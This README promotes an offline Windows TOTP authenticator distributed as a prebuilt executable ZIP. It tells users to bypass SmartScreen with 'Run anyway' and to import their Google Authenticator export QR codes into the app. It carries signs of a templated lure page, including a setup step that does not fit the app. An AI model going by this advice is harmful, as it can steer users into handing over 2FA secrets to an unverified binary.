<p align="center">
  <img src="https://i.postimg.cc/x8B4w8Vt/banner.png" alt="VaultAuth Desktop 2FA — Offline Encrypted Windows TOTP Authenticator & QR Importer" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Offline%202FA%20TOTP%20Vault-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-vaultauth--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# VaultAuth Desktop 2FA — Offline Encrypted Windows TOTP Authenticator & QR Importer

**Tired of grabbing your phone across the room every time Steam, GitHub, Discord, or AWS asks for a 6-digit 2FA code? Keep a fast, AES-256 encrypted offline TOTP authenticator on Windows with screen QR scanning and Google Authenticator export import.**

VaultAuth Desktop 2FA implements standard RFC 6238 TOTP (`SHA-1` / `SHA-256` / `6–8 digits`) in a local encrypted Windows vault: **scanning `otpauth://` QR codes directly off your monitor, importing Google Authenticator migration QR exports, and clearing the clipboard automatically after you paste**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) developers, gamers, and privacy-conscious users** who want a fast, offline desktop 2FA client with encrypted local backups.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Reaching for your phone 15 times a day for Steam/GitHub/Discord 2FA | Mobile-only authenticators slow down desktop logins | Click any entry in VaultAuth to copy the live 6-digit code in 0.1 seconds |
| Losing or breaking your phone locks you out of all 2FA accounts | Cloudless mobile apps trap TOTP seeds on a single device | Export an **AES-256 Encrypted Backup** to a USB drive or safe folder |
| Typing 32-character Base32 secret keys by hand causes typos | Manual setup keys are long and error-prone | Click **Scan QR From Screen** to capture the `otpauth://` QR directly off your browser |
| 2FA codes remain sitting in Windows clipboard history after pasting | Copied OTP tokens linger in memory | Auto-clear clipboard `20 seconds` after copying + set `ExcludeFromHistory` flag |

## Download for Windows

[**Download VaultAuth2FA.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/VaultAuth2FA.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `VaultAuth2FA.exe`? (Key features)

- Generates standard RFC 6238 **TOTP** codes (30s / 60s, 6 or 8 digits) 100% offline with zero cloud accounts.
- Protects your TOTP seed database with **AES-256-GCM** encryption + Argon2id/PBKDF2 master password derivation.
- Built-in **Scan QR From Screen** button reads `otpauth://` setup QR codes and **Google Authenticator Export QR** batches directly from your display.
- One-click code copy with automatic 20-second clipboard wipe and Windows Clipboard History exclusion.

### Sample Output

```text
[VaultAuth2FA] Vault Unlocked (Encryption: AES-256-GCM | System Clock Drift: +0.02s OK)
[OK]   GitHub (dev_user)  : 482 910  [22s remaining] -> Copied to Clipboard!
[OK]   Discord (player)   : 915 304  [22s remaining]
[INFO] Clipboard Guard    : Auto-wipe armed (Clears clipboard in 20s)
```

The release ZIP is named `VaultAuth2FA.zip`; the Windows executable inside is named `VaultAuth2FA.exe`.

1. Close VaultAuth 2FA before updating or replacing executable files.
2. Click **Download VaultAuth2FA.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `VaultAuth2FA.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with accurate system clock (automatic Windows time sync recommended).

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `VaultAuth2FA.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Instant desktop 2FA without reaching for your smartphone

Fuzzy search + 1-click copy speeds up daily logins across GitHub, Steam, Discord, and cloud consoles.

### Encrypted local backups against phone loss

Exporting an AES-256 encrypted `.vault` backup ensures you never lose access to your accounts.

### Screen QR capture + Google Authenticator migration support

Import all your existing Google Authenticator accounts in seconds by scanning the export QR code on screen.

### Automatic clipboard sanitization

Prevents copied 2FA codes from remaining in Windows Clipboard History (`Win+V`).

## Default folders and configuration paths

VaultAuth stores its encrypted vault database inside `%APPDATA%\VaultAuth2FA`:

```text
%APPDATA%\VaultAuth2FA\vault.enc
```

Typical directory layout:

```text
%APPDATA%\VaultAuth2FA\
├── vault.enc        (AES-256-GCM encrypted TOTP seeds)
└── settings.json    (Auto-lock timeout & clipboard wipe timer)
```

Remember your Master Password—because VaultAuth uses zero-knowledge local AES-256 encryption, forgotten master passwords cannot be recovered.

## Quick start guide

Follow these steps to get started:

1. **Extract `VaultAuth2FA.zip` to a local folder and launch `VaultAuth2FA.exe`.** Create a strong **Master Password** to initialize your encrypted vault.
2. **Click **+ Add Account -> Scan QR From Screen** over any 2FA setup QR code.** Or import a Google Authenticator export QR image.
3. **Click any account row to copy its live 6-digit code and paste with `Ctrl+V`.** Clipboard clears automatically after 20 seconds.
4. **Click **Export Encrypted Backup** and save a copy to a USB drive.** Keeps your 2FA seeds safe even if your PC or phone fails.

### Data safety note

Never store unencrypted screenshots of 2FA QR codes in plain folders after importing them.

## What the status summary shows

VaultAuth displays **vault encryption status, Windows NTP clock accuracy, stored account count, and clipboard auto-wipe timer**.

## FAQ

**Does VaultAuth sync my 2FA secrets to any cloud server?**

No. Everything is encrypted locally with AES-256-GCM inside `%APPDATA%\VaultAuth2FA\vault.enc` with zero network access.

**Why is system clock accuracy important for 2FA codes?**

TOTP codes are calculated from the current UTC timestamp; make sure Windows 'Set time automatically' is turned On.

**Can I import accounts from Google Authenticator?**

Yes—export your accounts in Google Authenticator as a QR code, show it on screen, and use VaultAuth's 'Scan QR From Screen' importer.

## Useful reading

- [IETF RFC 6238 — TOTP: Time-Based One-Time Password Algorithm](https://datatracker.ietf.org/doc/html/rfc6238)

## More Windows Desktop Utilities

- [ClipVault-OfflineClipboardHistory](../ClipVault-OfflineClipboardHistory) — Offline Windows clipboard history & plain-text snippet manager
- [ExifScrub-PhotoMetadataCleaner](../ExifScrub-PhotoMetadataCleaner) — Strip EXIF, GPS & PDF author metadata offline
- [AirDropPC-LocalWiFiTransfer](../AirDropPC-LocalWiFiTransfer) — Instant PC ↔ iPhone/Android Wi-Fi file transfer via QR code
- [PDFSign-WatermarkLock](../PDFSign-WatermarkLock) — Offline PDF signature stamper, watermark & AES-256 lock

*Independent open-source desktop utility for Windows. Always keep offline recovery codes provided by your services.*
